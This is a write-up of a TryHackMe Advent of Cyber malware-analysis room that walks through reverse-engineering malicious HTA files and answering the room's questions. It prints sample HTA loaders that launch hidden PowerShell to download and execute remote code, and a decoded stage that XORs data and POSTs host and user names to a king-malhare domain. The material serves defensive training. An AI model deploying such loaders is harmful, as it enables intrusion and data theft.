<h3 align="center">Advent of Cyber 2025 &nbsp;&nbsp; ¬∑  &nbsp;&nbsp; Day 21 &nbsp;&nbsp; ¬∑  &nbsp;&nbsp; Malware Analysis - Malhare.exe</h3>
<p align="center">2025, December 23  &nbsp; ¬∑  &nbsp; Hey! I¬¥m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I‚Äôm excited to join you on this adventure in <a href="https://tryhackme.com">TryHackMe</a>.<br>Learn about malware analysis and forensics. &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/htapowershell-aoc2025-p2l5k8j1h4">here</a>.<br><img width="80px" src="https://github.com/user-attachments/assets/f6199e8c-f6f4-491e-980b-6bc794e55e6c"<br><br><img width="1200px" src="https://github.com/user-attachments/assets/03757054-ef30-49b5-a992-e0fc5f35eb2b"></p>

<h2>Task 1 &nbsp; ¬∑  &nbsp; Introduction</h2>

<h6 align="center"><img width="600px" src="https://github.com/user-attachments/assets/4f5418f8-b3ab-4f50-80ea-b105934b80b7"><br>This image and all the theoretical content of the present article is TryHackMe¬¥s property.</h6>

<p>And in our kingdom of Wareville, just like in others, thousands of files of all kinds pass through the systems every day, from DOCX, PDF resumes received by our elves, to financial spreadsheets, CSVs from the accounting department, and executable files launched by different applications. But have you ever wondered which of these might be malicious? Which ones could actually belong to King Malhare? An interesting question, isn‚Äôt it?</p>

<h3>Learning Objectives</h3>
<p>In this task, the TBFC SOC team will investigate one specific file type, the HTA format - a type often used for legitimate purposes, yet just as frequently exploited by attackers. Your mission is to reverse-engineer the HTA and uncover how King Malhare tricked Wareville‚Äôs elves. To do this, you will have to look for:<br>

- Application metadata<br>
- Script functions<br>
- Any network calls or encoded data<br>
- Clues about exfiltration</p>

<h3>Connecting to the Machine</h3>
<p>Before moving forward, review the questions in the connection card shown below:</p>

Before moving forward, review the questions in the connection card shown below:

<h6 align="center"><img width="400px" src="https://github.com/user-attachments/assets/dbdd5ca0-b100-4729-a2a3-053cb8c1201f"><br><br>This image and all the theoretical content of<br> the present article is TryHackMe¬¥s property.</h6>

<p>Click on the <strong>Start AttackBox</strong> button at the top and open the malware sample using<br>
<code>pluma /root/Rooms/AoC2025/Day21/survey.hta</code>.</p>

<p><strong>Important!</strong>: This room uses an HTA malware file. It's safe, but <strong>do not</strong> run it locally. For safety and the intended experience, <code>you should use the AttackBox</code>; the file is already provided there. If you download it manually, browsers may block it. If it does download, open it only in a text editor, and do not execute it.</p>

<p><em>Answer the question below</em></p>

<p>1.1. <em>My AttackBox has started and I am ready to learn about malware analysis.</em><br>
<code>No answer needed</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3a34a371-4d10-447e-a5b6-36c1cfc70c2d"><br><br>Rosana¬¥s hands-on.</h6>


<h2>Task 2 &nbsp; ¬∑  &nbsp; Malware Analysis</h2>
<h3>HTA Overview</h3>


<p>Not long ago - in the summer of 2025 - researchers discovered that ransomware groups were using HTA files disguised as fake verification pages to spread the <a href="https://www.cloudsek.com/blog/threat-actors-lure-victims-into-downloading-hta-files-using-clickfix-to-spread-epsilon-red-ransomware">Epsilon Red</a> ransomware. During that campaign, many organisations were affected, and security teams were reminded how important it is to understand what HTA files are, and why they appear so often in corporate environments.<br>

So, what exactly are HTA files, and why do they exist? In Wareville's digital kingdom, not every strange-looking file is a threat. Some were originally created to make the daily work of developers and administrators easier. One such helpful invention is the HTA file, short for <strong>HTML Application</strong>. An HTA file is like a small desktop app built using familiar web technologies such as HTML, CSS, and JavaScript. Unlike regular web pages that open inside a browser, HTA files run directly on Windows through a built-in component called Microsoft HTML Application Host - <code>mshta.exe</code> process. This allows them to look and behave like lightweight programs with their own interfaces and actions. In legitimate use cases, HTA files serve several practical purposes in Wareville and beyond:<br>

- Automating administrative or setup tasks.<br>
- Providing quick interfaces for internal scripts.<br>
- Testing small prototypes without building full software.<br>
- Offering lightweight IT support utilities for daily use.<br>

In short, HTA files were designed as a convenient way to blend the simplicity of the web with the power of desktop applications, a tool that many TBFC‚Äôs engineers and elves still use to keep SOC-mas operations running smoothly.</p>


<h3>HTA File Strutucture</h3>
<p>Before the defenders of TBFC can recognise suspicious HTA files, it's important to understand how a normal HTA file is built. Luckily, their structure is quite simple, in fact, it's very similar to a regular HTML page. An HTA file usually contains three main parts:<br>

- <strong>The HTA declaration</strong>: This defines the file as an HTML Application and can include basic properties like title, window size, and behaviour.<br>
- <strong>The interface (HTML and CSS)</strong>: This section creates the layout and visuals, such as buttons, forms, or text.<br>
- <strong>The script (VBScript or JavaScript)</strong>: Here is where the logic lives; it defines what actions the HTA will perform when opened or when a user interacts with it.<br>

Here's a simple example of what a legitimate HTA file might look like:</p>

```bash
<html>
<head>
    <title>TBFC Utility Tool</title>
    <HTA:APPLICATION 
        ID="TBFCApp"
        APPLICATIONNAME="Utility Tool"
        BORDER="thin"
        CAPTION="yes"
        SHOWINTASKBAR="yes"
    />
</head>

<body>
    <h3>Welcome to the TBFC Utility Tool</h3>
    <input type="button" value="Say Hello" onclick="MsgBox('Hello from Wareville!')">
</body>
</html>
```

<p>This small example creates a simple desktop window with a button that shows a message when clicked. In real cases, HTA scripts can be much longer and perform important tasks. It's easy to see why developers liked HTA; you could build a quick, functional tool using nothing more than web code. However, as TBFC's defenders will soon learn, the same flexibility that makes HTA convenient also makes it powerful enough to require careful attention.</p>


<h3>How King Malhare Turns HTAs Into Weapons</h3>
<p>HTA files are attractive because they combine familiar web markup with script execution on Windows. In the hands of a defender, they‚Äôre a handy automation tool; in the hands of someone wanting to bypass controls, they can be used as a delivery mechanism or launcher.</p>

<h4>Common purposes of malicious HTA use:</h4>
<p>

- <strong>Initial access/delivery</strong>: HTA files are often delivered by phishing (email attachments, fake web pages, or downloads) and run via <code>mshta.exe</code>.<br>
- <strong>Downloaders/droppers</strong>: An HTA can execute a script that fetches additional binaries or scripts from the attacker's C2.<br>
- <strong>Obfuscation/evasion</strong>: HTAs can hide intent by embedding encoded data(Base64), by using short VBScript/JScript fragments, or by launching processes with hidden windows.<br>
- <strong>Living-off-the-land</strong>: HTA commonly calls built-in Windows tools (<code>mshta.exe</code>,<code>powershell.exe</code>,<code>wscript.exe</code> <code>rundll32.exe</code>) to avoid adding new binaries to disk.<br>

Inside an HTA, you'll often find a small script that may be obfuscated or encoded. In practice, this tiny script usually does one of two things: downloads and runs a second-stage payload, or opens a remote control channel to let something else talk back to the attacker's server. These lightweight scripts are the reason HTAs are effective launchers, a single small file can pull in the rest of the malware.<br>

Here is a sample that King Malhare might try to use:<br>

```bash
<html>
  <head>
    <title>Angry King Malhare</title>
    <HTA:APPLICATION ID="Malhare" APPLICATIONNAME="B" BORDER="none" 
     SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
    </HTA:APPLICATION>
    <script language="VBScript">
      Option Explicit:Dim a:Set a=CreateObject("WScript.Shell"):Dim 
      b:b="powershell -NoProfile -ExecutionPolicy Bypass -Command "" 
      {$U=
      [System.Text.Encoding]::UTF8.GetString([System.Convert]::
      FromBase64String('aHR0cHM6Ly9yYXcua2luZy1tYWxoYXJlWy5dY29tL2MyL3NpbHZlci9yZWZzL2hlYWRzL21haW4vUkVEQUNURUQudHh0')) 
      $C=(Invoke-WebRequest -Uri 
      $U -UseBasicParsing).Content 
      $B=[scriptblock]::Create($C) $B}""":a.Run 
      b,0,True:self.close
    </script>
  </head>
  <body>
  </body>
</html>
</p>
```

<p>As you can see, this HTA is very different from the simple example that we provided earlier; it contains a number of obscure elements that deserve a closer look. Let's walk through it.

When analysing HTAs, the <code><title></code> and <code>HTA:APPLICATION</code> tags often reveal how attackers disguise malicious apps. They might use a convincing name like ‚ÄòSalary Survey‚Äô or ‚ÄòInternal Tool‚Äô to appear safe, always check these first

Secondly, there‚Äôs a VBScript block marked by <code></script language="VBScript"></code> that‚Äôs the active part of the file where attackers often embed encoded commands or call external resources. Inside this block we find a PowerShell command <code>b:b="powershell -NoProfile -ExecutionPolicy Bypass -Command</code>, a pattern commonly seen in malicious HTAs used for delivery or launching. The PowerShell invocation contains a Base64-encoded blob - <code>FromBase64String</code>. This is likely a pointer to further instructions or a downloaded payload. If you see an encoded string, assume it hides a URL. Decoding it reveals the attacker‚Äôs command-and-control (C2) address or a resource used in the attack. Always decode before assuming what it does.

Malware authors often use multiple layers of encoding and encryption such as Base64 for obfuscation as some form of encryption or cipher to conceal the true payload. When you decode the Base64, check whether the output still looks like gibberish; if so, a second decryption step is needed.

For analysis, we'll extract that Base64 code: <code>aHR0cHM6Ly9yYXcua2luZy1tYWxoYXJlWy5dY29tL2MyL3NpbHZlci9yZWZzL2hlYWRzL21haW4vUkVEQUNURUQudHh0</code> and inspect it with a tool like <a href="https://gchq.github.io/CyberChef/">CyberChef</a> to reveal what it hides.</p>


<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/47cca6ae-fe02-4fe3-91bc-0c28d7b12f1b"><br><br>This image and all the theoretical content of the present article is TryHackMe¬¥s property.</h6>

<p><strong>Note</strong>: In the example, we've redacted the remote resource and replaced the real link with the REDACTED.txt file for safety. In a real incident, that string would usually point directly to a file hosted on the attacker's C2 domain (for example, a URL under king-malhare[.]com in our SOC-mas story).<br>

After the encoded PowerShell command, we can see three key variables: <code>$U</code>, <code>$C</code>, and <code>$B</code>. Let‚Äôs quickly break down what each does:<br>

- <strong>$U</strong>: Holds the decoded URL, the location from which the next script or payload will be fetched.<br>
- <strong>$C</strong>: Stores the content downloaded from that URL, usually a PowerShell script or text instructions.<br>
- <strong>$B</strong>: Converts that content into an executable scriptblock and runs it directly in memory.<br>

Whenever you see a chain of variables like this, try to trace where each one is created, used, and passed. If a variable ends up inside a function like Run, Execute, or Eval, that‚Äôs a sign that downloaded data is being executed, a key indicator of malicious activity.<br>

As a summary, the process for reviewing a suspicious HTA can be broken down into three main steps:<br>

- Identify the scripts section (VBScript)<br>
- Look for encoded data or external connections (e.g. Base64, HTTP requests)<br>
- Follow the logic to see what's execute or being sent out.<br>

We reviewed how attackers might use an HTA file for malicious purposes. Now that you‚Äôve seen how HTAs can combine HTML, VBScript, and PowerShell, you‚Äôll apply the same process to analyse a suspicious one. Start by locating script sections (<code><script language="VBScript"></code>), then identify functions, encoded strings, and any references to URLs or system calls. Decode anything that looks like it is hiding information, then trace how the script uses th</p>


<h3>From Surveys to Security Failings</h3>
<p>Our team figured out that some of the elves' laptops were compromised. Working through the incident, it seems that the one common denominator between them all is a survey that they completed regarding their salaries. The investigation found that an email was sent to these elves with an HTA attachment. The team is asking you to review the HTA file and provide feedback on what it is actually doing. You can choose to either use the AttackBox and find the file here <code>/root/Rooms/AoC2025/Day21/survey.hta</code> or download the attached task file and perform your analysis!<br>

Use a text editor to view the HTA to ensure that it doesn't execute, you can use pluma on the AttackBox by running the following command:<br>

<code>pluma /root/Rooms/AoC2025/Day21/survey.hta</code><br>

You will see the HTA as follows:</p>

<h6 align="center"><img width="600px" src="https://github.com/user-attachments/assets/49079fd2-648c-44fc-8583-089342982e3e"><br><br>This image and all the theoretical content of the present article is TryHackMe¬¥s property.</h6>

<p>We will start our analysis by searching for the metadata of the HTA, which will tell us what purpose it is telling users it has. This section is denoted by the <code>head</code> as shown below:</p>


<h6 align="center"><img width="600px" src="https://github.com/user-attachments/assets/58546b95-4465-4081-9371-a6ff3953f8dc"><br><br>This image and all the theoretical content of the present article is TryHackMe¬¥s property.</h6>

<p>Next we want to understand what the HTA actually does. This means we need to search for the VBScript section (<code><script type="text/vbscript"></code>) for function definitions, meaning to look for any lines that start with <code>unction</code> or <code>Sub</code>. In our HTA, we can see 5 functions namely:<br>

- <strong>window_onLoad</strong>: This function will autmatically execute when the HTA loads and executes the <code>getQuestions()</code> function.<br>
- <strong>getQuestions()</strong>: This function makes some external requests and then ultimately runs the <code>decodeBase64</code> function and calls the <code>provideFeedback</code> function with the data.<br>
- <strong>provideFeedback(feedbackString)</strong>: This function gathers some data about the computer, makes some external requests, and then ultimately executes something we still need to analyse.<br>
- <strong>decodeBase64(base64)</strong>: This function takes in a base64 string and converts it into binary.<br>
- <strong>RSBinaryToString(xBinary)</strong>: This function takes binary input and converts it back into a string.<br>

Within these functions, we want to understand any real actions being performed. These are usually denoted by <code>CreateObject()</code> with our application containing a couple, such as:<br>

- <strong>InternetExplorer.Application</strong>: Allows the application to make an external connection<br>
- <strong>WScript.Network</strong>: Connects to the computer's WScript Networking elements to uncover information<br>
- <strong>WScript.Shell</strong>: Creates a WScript shell that can be used to execute commands on the computer<br>

Lastly, we want to understand what the HTA actually looks like to the user. Here it is very similar to HTML files. To do this, we need to take a look at the <code>body</code> part of the HTA starting at line 169. This is the part that will actually be shown to the user.<br>

Using the information and steps given above, it is time to perform an analysis of this HTA and figure out what King Malhare is up to!</p>


<p><em>Answer the questions below</em></p>

<p>2.1. <em>What is the title of the HTA application?</em> Hint: Look at the title element of the HTA<br>
<code>Best Festival Company Developer Survey</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/316a592e-40ac-4c70-9c4e-365b1e183a16"><br><br>Rosana¬¥s hands-on.</h6>

<br>
<p>2.2. <em>What VBScript function is acting as if it is downloading the survey questions?</em><br>
<code>getQuestions</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/7c8b02fc-0b1c-4be2-a708-e4b5bd1f6d55"><br><br>Rosana¬¥s hands-on.</h6>

<br>
<p>2.3. <em>What URL domain (including sub-domain) is the "questions" being downloaded from?</em><br>
<code>survey.bestfestiivalcompany.com</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/a73e31ce-4b84-47c4-a5e9-78bf1b0c1617"><br><br>Rosana¬¥s hands-on.</h6>


<br>
<p>2.4. <em>Malhare seems to be using typosquatting, domains that look the same as the real one, in an attempt to hide the fact that the domain is not the inteded one, what character in the domain gives this away?</em> Hint: Compare the domain in the HTA to what you‚Äôd expect the legitimate one to be (survey.bestfestivalcompany.com). Identify which single character differs<br>
<code>i</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/bddfacf4-8a84-40e2-9d0a-12c6b4d6d5a2"><br><br>Rosana¬¥s hands-on.</h6>


<br>
<p>2.5. <em>Malicious HTAs often include real-looking data, like survey questions, to make the file seem authentic. How many questions does the survey have?</em> Hint: Review the <body> section of the HTA. Look at the multiple choice questions being displayed to the user.<br>
<code>4</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/61190f48-16bd-446a-b83a-baaa02b35b99"><br><br>
                   <img width="1200px" src="https://github.com/user-attachments/assets/d5a17153-8d08-4df8-a45f-047966fb5d6e"><br><br>Rosana¬¥s hands-on.</h6>


<br>
<p>2.6. <em>Notice how even in code, social engineering persists, fake incentives like contests or trips hide in plain sight to build trust. The survey entices participation by promising a chance to win a trip to where?</em> Hint: Review the <body> section of the HTA.<br>
<code>South Pole</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/c408f1c2-7d53-46ee-8ff5-9682ff3c4d43"><br><br>Rosana¬¥s hands-on.</h6>

<br>
<p>2.7. <em>The HTA is enumerating information from the local host executing the application. What two pieces of information about the computer it is running on are being exfiltrated? You should provide the two object names separated by commas.</em> Hint : Look at what values are extracted using the CreateObject(WScript.Network) object.<br>
<code>ComputerName,UserName</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/03ca981b-ee78-490f-8f53-766b8a5488e5"><br><br>Rosana¬¥s hands-on.</h6>

<br>
<p>2.8. <em>What endpoint is the enumerated data being exfiltrated to?</em> Hint: Trace where the enumeration data is sent. Look for HTTP commands referencing a path (e.g., /data, /report), that‚Äôs the exfiltration endpoint.<br>
<code>/details</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3a134c21-101f-4f87-91ac-b86ac85474a8"><br><br>Rosana¬¥s hands-on.</h6>


<br>
<p>2.9. <em>What HTTP method is being used to exfiltrate the data?</em> Hint: Review the exfiltration line. Is it adding the data as URL parameters or in the body of the request?<br>
<code>GET</code></p>


<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/80111818-210f-4e15-b6ea-d69b7c30223f"><br><br>Rosana¬¥s hands-on.</h6>

<p>2.10. <em>After reviewing the function intended to get the survey questions, it seems that the data from the download of the questions is actually being executed. What is the line of code that executes the contents of the download?</em> Hint: Follow how the downloaded content is stored and used. Identify the specific line where the script takes that content and executes it (e.g., using Run, Execute, or ScriptBlock). Provide the full line.<br>
<code>runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False</code><br>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/1ba68eef-23c5-4b4b-a264-dcf146cc7fb0"><br><br>Rosana¬¥s hands-on.</h6>


<br>
<p>2.11. <em>It seems as if the malware site has been taken down, so we cannot download the contents that the malware was executing. Fortunately, one of the elves created a copy when the site was still active. Download the contents from here. What popular encoding scheme was used in an attempt to obfuscate the download?</em><br>
<code>base64</code><br>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/f2500362-8d0d-4ba3-8c96-edf97196b56d"><br><br>
                   <img width="1200px" src="https://github.com/user-attachments/assets/0f0e82d0-5b38-4185-a0db-f5e9bb8b26cb"><br><br>Rosana¬¥s hands-on.</h6>
<br>

```bash
:~/Rooms/AoC2025/Day21# curl https://assets.tryhackme.com/additional/aoc2025/files/blob.txt
ZnVuY3Rpb24gQUFCQiB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkpXQogICAgICAgIFtzdHJpbmddJFRleHQKICAgICkKCiAgICAkc2IgPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXIgJFRleHQuTGVuZ3RoCiAgICBmb3JlYWNoICgkY2ggaW4gJFRleHQuVG9DaGFyQXJyYXkoKSkgewogICAgICAgICRjID0gW2ludF1bY2hhcl0kY2gKCiAgICAgICAgaWYgKCRjIC1nZSA2NSAtYW5kICRjIC1sZSA5MCkgeyAgICAgICAgICAgCiAgICAgICAgICAgICRjID0gKCgkYyAtIDY1ICsgMTMpICUgMjYpICsgNjUKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkYyAtZ2UgOTcgLWFuZCAkYyAtbGUgMTIyKSB7ICAgICAgCiAgICAgICAgICAgICRjID0gKCgkYyAtIDk3ICsgMTMpICUgMjYpICsgOTcKICAgICAgICB9CgogICAgICAgIFt2b2lkXSRzYi5BcHBlbmQoW2NoYXJdJGMpCiAgICB9CiAgICAkc2IuVG9TdHJpbmcoKQp9CgokZmxhZyA9ICdHVVp7Wm55am5lci5OYW55bGZycX0nCgokZGVjbyA9IEFBQkIgLVRleHQgJGZsYWcKV3JpdGUtT3V0cHV0ICRkZWNv
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/022beb40-4582-4ea1-831c-9a3e9a368126"><br><br>Rosana¬¥s hands-on.</h6>

<br>
<p>2.12. <em>Decode the payload. It seems as if additional steps where taken to hide the malware! What common encryption scheme was used in the script?</em> Hint : After decoding, if the result still appears scrambled, look through the script for encryption functions or variable names. Identify what encryption method (e.g., AES, XOR) was used. CyberChef can help here if you just give it the scrambled flag line.<br>
<code>ROT13</code></p>

<p>
  
- function <code>AABB</code> checks if each character is an uppercase letter (A‚ÄìZ) or lowercase letter (a‚Äìz),<br>
- for letters, it shifts the character code by 13 positions within the alphabet using modular arithmetic (% 26),<br>
- non-alphabetic characters remain unchanged.</p>

```bash
:~/Rooms/AoC2025/Day21# echo -n 'ZnVuY3Rpb24gQUFCQiB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkpXQogICAgICAgIFtzdHJpbmddJFRleHQKICAgICkKCiAgICAkc2IgPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXIgJFRleHQuTGVuZ3RoCiAgICBmb3JlYWNoICgkY2ggaW4gJFRleHQuVG9DaGFyQXJyYXkoKSkgewogICAgICAgICRjID0gW2ludF1bY2hhcl0kY2gKCiAgICAgICAgaWYgKCRjIC1nZSA2NSAtYW5kICRjIC1sZSA5MCkgeyAgICAgICAgICAgCiAgICAgICAgICAgICRjID0gKCgkYyAtIDY1ICsgMTMpICUgMjYpICsgNjUKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkYyAtZ2UgOTcgLWFuZCAkYyAtbGUgMTIyKSB7ICAgICAgCiAgICAgICAgICAgICRjID0gKCgkYyAtIDk3ICsgMTMpICUgMjYpICsgOTcKICAgICAgICB9CgogICAgICAgIFt2b2lkXSRzYi5BcHBlbmQoW2NoYXJdJGMpCiAgICB9CiAgICAkc2IuVG9TdHJpbmcoKQp9CgokZmxhZyA9ICdHVVp7Wm55am5lci5OYW55bGZycX0nCgokZGVjbyA9IEFBQkIgLVRleHQgJGZsYWcKV3JpdGUtT3V0cHV0ICRkZWNv' | base64 -d
function AABB {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Text
    )

    $sb = New-Object System.Text.StringBuilder $Text.Length
    foreach ($ch in $Text.ToCharArray()) {
        $c = [int][char]$ch

        if ($c -ge 65 -and $c -le 90) {           
            $c = (($c - 65 + 13) % 26) + 65
        }
        elseif ($c -ge 97 -and $c -le 122) {      
            $c = (($c - 97 + 13) % 26) + 97
        }

        [void]$sb.Append([char]$c)
    }
    $sb.ToString()
}

$flag = 'GUZ{Znyjner.Nanylfrq}'

$deco = AABB -Text $flag
Write-Output $deco
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/c95f4601-477c-409b-b78e-93fb04b05e21"><br><br>Rosana¬¥s hands-on.</h6>

<br>
<br>
<p align="center">you can also use <strong>SyberChef</strong></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/c4c1d7a3-0372-40a8-b11e-e9e5b6f4ebdb"><br><br>Rosana¬¥s hands-on.</h6>

<br>
<p>2.13. <em>Either run the script or decrypt the flag value using online tools such as CyberChef. What is the flag value?</em><br>
<code>THM{Malware.Analysed}
</code>

```bash
:~/Rooms/AoC2025/Day21# echo 'GUZ{Znyjner.Nanylfrq}' |  tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/16d9d556-cb6d-497b-93ac-5a80e148a853"><br><br>Rosana¬¥s hands-on.</h6>

<br>
<br>
<p align="center">you can also use <strong>SyberChef</strong></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/4b6639e8-5725-46d8-b4fa-2ced4e56a0e7"><br><br>Rosana¬¥s hands-on.</h6>


<p>2.14. <em>For those who want another challenge, download the HTA file from <a href="https://assets.tryhackme.com/additional/aoc2025/SQ4/NorthPole.zip">here</a> to get the key for Side Quest 4, accessible through our <a href="https://tryhackme.com/adventofcyber25/sidequest">Side Quest Hub</a>. The password for the file is <code>CanYouREM3?</code>.</em><br>
<code>No answer needed</code></p>

```bash
:~/Rooms/AoC2025/Day21# curl https://assets.tryhackme.com/additional/aoc2025/SQ4/NorthPole.zip -o Northpole.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  529k  100  529k    0     0  20.6M      0 --:--:-- --:--:-- --:--:-- 20.6M
```

```bash
:~/Rooms/AoC2025/Day21# file Northpole.zip
Northpole.zip: Zip archive data, at least v2.0 to extract
```

```bash
:~/Rooms/AoC2025/Day21# unzip Northpole.zip
Archive:  Northpole.zip
[Northpole.zip] NorthPolePerformanceReview.hta password: 
  inflating: NorthPolePerformanceReview.hta
```

```bash
:~/Rooms/AoC2025/Day21# file NorthPolePerformanceReview.hta
NorthPolePerformanceReview.hta: HTML document, ASCII text
```

```bash
:~/Rooms/AoC2025/Day21# head -n 13 NorthPolePerformanceReview.hta
<html>
  <head>
    <title>North Pole Performance Review 2025</title>
    <HTA:APPLICATION ID="Perf"
                     APPLICATIONNAME="North Pole Performance Review"
                     BORDER="dialog"
                     SHOWINTASKBAR="yes"
                     SINGLEINSTANCE="yes"
                     WINDOWSTATE="normal"></HTA:APPLICATION>
    <script language="VBScript">
      Option Explicit
      Dim s,c,p,fso,t,f
      p = "JGg9JGVudjpDT01QVVRFUk5BTUUKJHU9JGVudjpVU0VSTkFNRQokaz0yMwokZD0nbmtkWlVCb2REUjBYRnhjYVhsOVRSUmNYRllzWEZ4Uy9IeEVYRnhkcndETzlGeGMzRjE1VFZrTnZ6ZnVxYm84emNHS3c3SWs0Slh5NC9VS3F2cXpDelUxY2ZINDZIeDZXei9adEo1" & _
```

```bash
:~/Rooms/AoC2025/Day21# tail -n 52 NorthPolePerformanceReview.hta
      "YWRlcnMgQHtIPSRoO1U9JHV9Cgo="
      Set fso = CreateObject("Scripting.FileSystemObject")
      t = fso.GetSpecialFolder(2)
      Set f = fso.CreateTextFile(t & "\stg.b64", True)
      f.Write p
      f.Close
      Set s = CreateObject("WScript.Shell")
      c = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$x=[System.IO.File]::ReadAllText((Join-Path $env:TEMP 'stg.b64')); $s=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x)); IEX $s"""
      s.Run c,0,True
    </script>
  </head>
  <body>
    <h2>North Pole Elf Performance Review</h2>
    <p>Please complete your end-of-season review. All responses are confidential.</p>
    <table>
      <tr>
        <td>Elf Name:</td>
        <td><input type="text" id="elfName" value="Anonymous Elf"></td>
      </tr>
      <tr>
        <td>Workshop:</td>
        <td>
          <select id="workshop">
            <option>Toy Assembly</option>
            <option>Wrapping</option>
            <option>Logistics</option>
            <option>QA & Testing</option>
          </select>
        </td>
      </tr>
      <tr>
        <td>Morale (1-5):</td>
        <td>
          <select id="morale">
            <option>1 - Struggling</option>
            <option>2 - Tired</option>
            <option>3 - Okay</option>
            <option>4 - Happy</option>
            <option>5 - Overjoyed</option>
          </select>
        </td>
      </tr>
      <tr>
        <td>Overtime Hours:</td>
        <td><input type="text" id="ot" value="0"></td>
      </tr>
    </table>
    <p>
      <button onclick="window.close()">Submit Review</button>
    </p>
  </body>
</html>
```

<p align="center"></p>

```bash
:~/Rooms/AoC2025/Day21# grep -o '"[A-Za-z0-9+/=]\+"' Challenge.txt  | sed 's/"//g' > rose.txt
```

```bash
:~/Rooms/AoC2025/Day21# head -n 5 rose.txt
JGg9JGVudjpDT01QVVRFUk5BTUUKJHU9JGVudjpVU0VSTkFNRQokaz0yMwokZD0nbmtkWlVCb2REUjBYRnhjYVhsOVRSUmNYRllzWEZ4Uy9IeEVYRnhkcndETzlGeGMzRjE1VFZrTnZ6ZnVxYm84emNHS3c3SWs0Slh5NC9VS3F2cXpDelUxY2ZINDZIeDZXei9adEo1
RVdkR1NxOW5yM0dad1FENXQycnlIM2ZHd1JlM1QwNW5sMERIU1kwTThVMFhlNTBIZDdGQlVXVlI5ZWY4akh6VXo2UW82Q1hHdnc2UVlHamtockRrN0taMHhWMTI2SUVFT0NBZzRPRGdZSzVweWs2eGtQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQ
a1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtY
WVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQ
a1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtY
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/39d97443-661d-4990-8d55-21ec99add236"><br><br>
                   <img width="1200px" src="https://github.com/user-attachments/assets/0b17880c-370c-40b8-9e05-b036a15af6e6"><br><br>Rosana¬¥s hands-on.</h6>

<img width="1214" height="337" alt="image" src="https://github.com/user-attachments/assets/3c023ed0-4eae-4f6e-abb9-eac2c22ba884" />


```bash
# head -n 3 download.dat
$h=$env:COMPUTERNAME
$u=$env:USERNAME
$k=23

```

```bash
:~# tail -n 4 download.dat
$b=[System.Convert]::FromBase64String($d)
for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k}
Invoke-WebRequest -Uri "https://perf.king-malhare[.]com/image" -Method POST -Body $b -Headers @{H=$h;U=$u}

```


<img width="1216" height="837" alt="image" src="https://github.com/user-attachments/assets/5b376772-7f6f-4ce7-a9b9-c9348e324de6" />



<p>2.15. <em>If you enjoyed today's room, you may also like the<a href="https://tryhackme.com/room/maldoc">MalDoc: Static Analysis</a> room.</em><br>
<code>No answer needed</p>

<br>
<br>
<h1 align="center">Completed</h1>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/86e53b99-3cc9-4818-9ab8-e467dcbfa944"><br><br>
